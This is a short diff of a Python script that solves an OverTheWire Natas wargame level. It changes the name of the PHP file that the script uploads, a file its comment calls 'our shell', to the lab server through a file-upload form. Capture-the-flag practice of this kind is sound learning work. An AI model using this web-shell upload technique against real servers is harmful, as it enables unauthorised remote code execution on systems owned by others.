@@ -12,7 +12,7 @@ url = "http://%s.natas.labs.overthewire.org/" % username
 session = requests.Session()
 
 #we upload our shell
-response = session.post(url,files={"uploadedfile": open("natas13.php","rb") } , data= {"filename" : "natas13.php"}, auth = (username, password))
+response = session.post(url,files={"uploadedfile": open("natas12.php","rb") } , data= {"filename" : "natas12.php"}, auth = (username, password))
 
 # we get the response bla bla bla upload succesfull etc
 content = response.text
